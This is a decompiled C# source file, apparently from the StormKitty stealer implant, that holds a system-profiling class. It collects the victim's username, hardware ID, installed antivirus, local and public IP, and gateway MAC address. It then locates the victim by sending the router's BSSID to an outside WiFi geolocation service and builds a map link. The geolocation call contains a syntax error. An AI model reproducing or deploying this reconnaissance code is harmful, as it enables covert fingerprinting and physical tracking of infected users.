﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using StormKitty.Implant;

namespace StormKitty
{
	// Token: 0x02000066 RID: 102
	internal sealed class SystemInfo
	{
		// Token: 0x06000174 RID: 372
		[DllImport("iphlpapi.dll", ExactSpelling = true)]
		private static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);

		// Token: 0x06000175 RID: 373 RVA: 0x0000B9F4 File Offset: 0x00009BF4
		public static string ScreenMetrics()
		{
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			int width = bounds.Width;
			int height = bounds.Height;
			return width.ToString() + "x" + height.ToString();
		}

		// Token: 0x06000176 RID: 374 RVA: 0x0000BA34 File Offset: 0x00009C34
		public static string GetBattery()
		{
			try
			{
				string str = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
				string[] array = SystemInformation.PowerStatus.BatteryLifePercent.ToString().Split(new char[]
				{
					','
				});
				string str2 = array[array.Length - 1];
				return str + " (" + str2 + "%)";
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000177 RID: 375 RVA: 0x0000BAB4 File Offset: 0x00009CB4
		private static string GetWindowsVersionName()
		{
			string text = "Unknown System";
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						text = Convert.ToString(((ManagementObject)managementBaseObject)["Name"]);
					}
					text = text.Split(new char[]
					{
						'|'
					})[0];
					int length = text.Split(new char[]
					{
						' '
					})[0].Length;
					text = text.Substring(length).TrimStart(new char[0]).TrimEnd(new char[0]);
				}
			}
			catch
			{
			}
			return text;
		}

		// Token: 0x06000178 RID: 376 RVA: 0x0000BB9C File Offset: 0x00009D9C
		private static string GetBitVersion()
		{
			try
			{
				if (Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86"))
				{
					return "(32 Bit)";
				}
				return "(64 Bit)";
			}
			catch
			{
			}
			return "(Unknown)";
		}

		// Token: 0x06000179 RID: 377 RVA: 0x0000BC00 File Offset: 0x00009E00
		public static string GetSystemVersion()
		{
			return SystemInfo.GetWindowsVersionName() + " " + SystemInfo.GetBitVersion();
		}

		// Token: 0x0600017A RID: 378 RVA: 0x0000BC18 File Offset: 0x00009E18
		public static string GetHardwareID()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("Select ProcessorId From Win32_processor").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["ProcessorId"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600017B RID: 379 RVA: 0x0000BC98 File Offset: 0x00009E98
		public static string GetDefaultGateway()
		{
			try
			{
				return (from a in (from n in NetworkInterface.GetAllNetworkInterfaces()
				where n.OperationalStatus == OperationalStatus.Up
				where n.NetworkInterfaceType != NetworkInterfaceType.Loopback
				select n).SelectMany(delegate(NetworkInterface n)
				{
					IPInterfaceProperties ipproperties = n.GetIPProperties();
					if (ipproperties == null)
					{
						return null;
					}
					return ipproperties.GatewayAddresses;
				}).Select(delegate(GatewayIPAddressInformation g)
				{
					if (g == null)
					{
						return null;
					}
					return g.Address;
				})
				where a != null
				select a).FirstOrDefault<IPAddress>().ToString();
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600017C RID: 380 RVA: 0x0000BD88 File Offset: 0x00009F88
		public static string GetAntivirus()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					List<string> list = new List<string>();
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						list.Add(managementBaseObject["displayName"].ToString());
					}
					if (list.Count == 0)
					{
						return "Not installed";
					}
					return string.Join(", ", list.ToArray()) + ".";
				}
			}
			catch
			{
			}
			return "N/A";
		}

		// Token: 0x0600017D RID: 381 RVA: 0x0000BE68 File Offset: 0x0000A068
		public static string GetLocalIP()
		{
			try
			{
				foreach (IPAddress ipaddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						return ipaddress.ToString();
					}
				}
			}
			catch
			{
			}
			return "No network adapters with an IPv4 address in the system!";
		}

		// Token: 0x0600017E RID: 382 RVA: 0x0000BEC8 File Offset: 0x0000A0C8
		public static string GetPublicIP()
		{
			try
			{
				return new WebClient().DownloadString("http://icanhazip.com").Replace("\n", "");
			}
			catch
			{
			}
			return "Request failed";
		}

		// Token: 0x0600017F RID: 383 RVA: 0x0000BF24 File Offset: 0x0000A124
		private static string GetBSSID()
		{
			byte[] array = new byte[6];
			uint num = (uint)array.Length;
			try
			{
				if (SystemInfo.SendARP(BitConverter.ToInt32(IPAddress.Parse(SystemInfo.GetDefaultGateway()).GetAddressBytes(), 0), 0, array, ref num) != 0)
				{
					return "unknown";
				}
				string[] array2 = new string[num];
				int num2 = 0;
				while ((long)num2 < (long)((ulong)num))
				{
					array2[num2] = array[num2].ToString("x2");
					num2++;
				}
				return string.Join(":", array2);
			}
			catch
			{
			}
			return "Failed";
		}

		// Token: 0x06000180 RID: 384 RVA: 0x0000BFBC File Offset: 0x0000A1BC
		public static string GetLocation()
		{
			string bssid = SystemInfo.GetBSSID();
			string text = "Unknown";
			string text2 = "Unknown";
			string text3 = "Unknown";
			string text4;
			try
			{
				using (WebClient webClient = new WebClient())
				{
					text4 = webClient.DownloadString("https://api.mylnikov.org/geolocation/wifi?v=1.1&bssid=") + bssid);
				}
			}
			catch
			{
				return "BSSID: " + bssid;
			}
			if (!text4.Contains("{\"result\":200"))
			{
				return "BSSID: " + bssid;
			}
			int num = 0;
			string[] array = text4.Split(new char[]
			{
				' '
			});
			foreach (string text5 in array)
			{
				num++;
				if (text5.Contains("\"lat\":"))
				{
					text = array[num].Replace(",", "");
				}
				if (text5.Contains("\"lon\":"))
				{
					text2 = array[num].Replace(",", "");
				}
				if (text5.Contains("\"range\":"))
				{
					text3 = array[num].Replace(",", "");
				}
			}
			string text6 = string.Concat(new string[]
			{
				"BSSID: ",
				bssid,
				"\nLatitude: ",
				text,
				"\nLongitude: ",
				text2,
				"\nRange: ",
				text3
			});
			if (text != "Unknown" && text2 != "Unknown")
			{
				text6 = string.Concat(new string[]
				{
					text6,
					"\n[Open google maps](","https://www.google.com.ua/maps/place/",
					text,
					" ",
					text2,
					")"
				});
			}
			return text6;
		}

		// Token: 0x06000181 RID: 385 RVA: 0x0000C1B0 File Offset: 0x0000A3B0
		public static string GetCPUName()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["Name"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000182 RID: 386 RVA: 0x0000C234 File Offset: 0x0000A434
		public static string GetGPUName()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["Name"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000183 RID: 387 RVA: 0x0000C2B8 File Offset: 0x0000A4B8
		public static string GetRamAmount()
		{
			try
			{
				int num = 0;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							num = (int)(Convert.ToDouble(((ManagementObject)enumerator.Current)["TotalPhysicalMemory"]) / 1048576.0);
						}
					}
				}
				return num.ToString() + "MB";
			}
			catch
			{
			}
			return "-1";
		}

		// Token: 0x040000EA RID: 234
		public static string username = Environment.UserName;

		// Token: 0x040000EB RID: 235
		public static string compname = Environment.MachineName;

		// Token: 0x040000EC RID: 236
		public static string culture = CultureInfo.CurrentCulture.ToString();

		// Token: 0x040000ED RID: 237
		public static string datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");
	}
}
